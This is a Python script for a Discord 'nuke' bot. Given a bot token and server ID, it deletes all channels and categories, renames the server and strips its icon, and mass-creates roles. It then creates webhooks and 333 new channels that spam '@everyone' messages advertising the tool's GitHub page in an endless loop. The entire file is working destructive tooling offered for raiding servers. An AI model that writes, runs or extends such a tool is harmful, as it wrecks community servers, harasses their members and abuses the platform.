import discord
from discord.ext import commands
from colorama import init, Fore
import asyncio
import time
import fade 
import random
import requests
ilykii = '''
                                                                   
 ▄█   ▄█       ▄██   ▄      ▄█   ▄█▄  ▄█   ▄█  
███  ███       ███   ██▄   ███ ▄███▀ ███  ███  
███▌ ███       ███▄▄▄███   ███▐██▀   ███▌ ███▌ 
███▌ ███       ▀▀▀▀▀▀███  ▄█████▀    ███▌ ███▌ 
███▌ ███       ▄██   ███ ▀▀█████▄    ███▌ ███▌ 
███  ███       ███   ███   ███▐██▄   ███  ███  
███  ███▌    ▄ ███   ███   ███ ▀███▄ ███  ███  
█▀   █████▄▄██  ▀█████▀    ███   ▀█▀ █▀   █▀    made by kikmanONTOP                    
                                                redesigned by nxwy
                                                github.com/kikmanONTOP
           '''                                      

webhook_count = 2
messages_per_webhook = 10
message_interval = 0
faded_text = fade.greenblue(ilykii)
print(faded_text)
intents = discord.Intents.all()
bot = discord.Client(intents=intents)
token = input(Fore.LIGHTCYAN_EX + "discord bot token: ")
guild_id = input("server id: ")
spam_message = input("spam message: ")
new_channels_name = input("new channels name: ")

async def send_message_periodically(channel):
    while True:
        await channel.send("@everyone DOWNLOAD THIS TOOL https://github.com/kikmanONTOP/ilykiipro" + spam_message)
        await asyncio.sleep(0)
        print(Fore.GREEN + "spammed:", channel.name)


async def send_messages(webhook_url, count):
    for i in range(count):
        message_content = f"@everyone DOWNLOAD THIS TOOL https://github.com/kikmanONTOP/ilykiipro"
        
        requests.post(webhook_url, json={"content": message_content})
        
        print(f"spammed {i + 1} sent successfully.")
        await asyncio.sleep(0)

@bot.event
async def on_ready():
    print(f"ilykii is ready as {bot.user}")

    guild = bot.get_guild(int(guild_id))

    if guild is None:
        print("server id error")
        return
    
    if guild:
        ignore_channel_name = "NXWY SMRDI"

        categories = [category for category in guild.categories if category.name != ignore_channel_name]
        text_channels = [channel for channel in guild.text_channels if channel.name != ignore_channel_name]
        voice_channels = [channel for channel in guild.voice_channels if channel.name != ignore_channel_name]

        for channel in text_channels:
            try:
                await channel.delete()
                await asyncio.sleep(0)
                print("deleted:", channel.name)
            except:
                pass
        for channel in voice_channels:
            try:
                await channel.delete()
                await asyncio.sleep(0)
                print("deleted:", channel.name)
            except:
                pass
        for category in categories:
            try:
                await category.delete()
                await asyncio.sleep(0)
                print("deleted", category.name)
            except:
                pass
        try:
            await guild.edit(name="gg kids")
            print("server name changed")
        except:
            print("name edit error")
        try:
            await guild.edit(icon=None)
            print("server pfp changed")
        except:
            print("pfp edit error")

    if guild:
        for i in range(1, 23):
            role_name = f"gg kids"
            await guild.create_role(name=role_name, color=discord.Color.random())
            print(f"Role created: {role_name}")
        channels = guild.channels

        text_channels = [channel for channel in channels if isinstance(channel, discord.TextChannel)]

        if not text_channels:
            print(f"No text channels found in {guild.name}. Skipping webhook creation.")
            return

        for i in range(webhook_count):
            channel = random.choice(text_channels)

            webhook = await channel.create_webhook(name=f"Nuke bot was here {i + 1}")
            print(f"Webhook {i + 1} created in {guild.name}/{channel.name}: {webhook.url}")

            asyncio.create_task(send_messages(webhook.url, messages_per_webhook))

        for i in range(333):
            channel_name = new_channels_name
            channel = await guild.create_text_channel(channel_name)
            await asyncio.sleep(0)
            print("created:", channel.name)
            bot.loop.create_task(send_message_periodically(channel))

bot.run(token)
